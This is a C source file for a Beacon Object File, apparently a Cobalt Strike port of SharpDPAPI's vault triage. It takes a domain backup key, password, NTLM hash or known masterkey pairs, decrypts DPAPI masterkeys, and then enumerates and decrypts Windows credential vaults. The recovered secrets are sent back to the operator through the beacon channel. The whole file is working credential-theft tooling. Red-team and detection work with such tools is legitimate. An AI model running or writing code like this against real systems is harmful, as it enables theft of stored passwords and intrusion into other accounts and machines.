/*
 * vaults.c — BOF for DPAPI vault triage
 *
 * Usage:
 *   vaults [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
 *          [/credkey:KEY] [/target:PATH] [/server:SERVER]
 *
 * Enumerates and decrypts Windows credential vault files.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* pvk_b64    = BeaconDataExtract(&parser, NULL);
    char* password   = BeaconDataExtract(&parser, NULL);
    char* ntlm       = BeaconDataExtract(&parser, NULL);
    char* credkey    = BeaconDataExtract(&parser, NULL);
    char* target_str = BeaconDataExtract(&parser, NULL);
    char* server_str = BeaconDataExtract(&parser, NULL);

    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0)
        pvk = base64_decode(pvk_b64, &pvk_len);

    wchar_t* target = NULL;
    wchar_t* server = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
    if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Pre-load keys from credkey */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Vaults (BOF) ===\n");

    /* Step 1: Triage masterkeys */
    if (pvk || password || ntlm) {
        triage_user_masterkeys(&cache, pvk, pvk_len,
            (password && strlen(password) > 0) ? password : NULL,
            (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
            NULL, FALSE, target, server, FALSE, NULL);
    }

    /* Step 2: Triage vaults */
    if (target) {
        triage_vault_folder(&cache, target);
    } else {
        triage_user_vaults(&cache, NULL, server);
    }

    if (cache.count > 0) {
        mk_cache_print(&cache);
    }

    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    if (target) intFree(target);
    if (server) intFree(server);
}
